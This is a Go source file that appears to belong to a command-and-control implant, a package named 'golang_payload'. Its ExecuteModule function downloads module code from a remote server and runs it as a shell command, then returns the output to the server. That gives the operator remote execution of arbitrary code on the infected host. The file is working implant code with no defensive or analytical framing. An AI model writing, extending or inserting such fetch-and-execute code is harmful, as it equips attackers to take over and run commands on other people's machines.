package actions

import (
	"encoding/json"
	comms "golang_payload/communication"
	types "golang_payload/types"
	utils "golang_payload/utils"
	"io"
	"net/http"
)

func fetchModuleInfo(task types.Task) (module types.Module, err error) {
	resp, err := comms.GetRequest("module/" + task.Name)

	if err != nil || resp.StatusCode != http.StatusOK {
		return
	}

	defer resp.Body.Close()

	module_body, err := io.ReadAll(resp.Body)

	if err != nil {
		return
	}

	err = json.Unmarshal(module_body, &module)

	if err != nil {
		return
	}

	return
}

func downloadModuleCode(task types.Task) (moduleCode []byte, err error) {
	resp, err := comms.GetRequest("module/download/" + task.Name)

	if err != nil || resp.StatusCode != http.StatusOK {
		return
	}

	defer resp.Body.Close()

	moduleCode, err = io.ReadAll(resp.Body)

	if err != nil {
		return
	}

	return
}

func ExecuteModule(
	task types.Task,
) {
	// Get the module info
	module, err := fetchModuleInfo(task)

	if err != nil {
		utils.Finish(task, "Could not fetch module info.", false)
		return
	}

	// Download the module code
	module_code, err := downloadModuleCode(task)

	if err != nil {
		utils.Finish(task, "Could not download module code.", false)
		return
	}

	// check if module's supported execution methods contain the task's execution method
	var supported bool
	for _, method := range module.Execution_methods {
		if method == task.Args["execution_method"] {
			supported = true
			break
		}
	}

	if !supported {
		utils.Finish(task, "Unsupported execution method.", false)
		return
	}
	var ( 
		output string
		success bool
	)
	if task.Args["execution_method"] == "command" {
		output, success = RunCommand(string(module_code))
	} else {
		output, success = "Unsupported execution method.", false
	}
	utils.Finish(task, output, success)
}
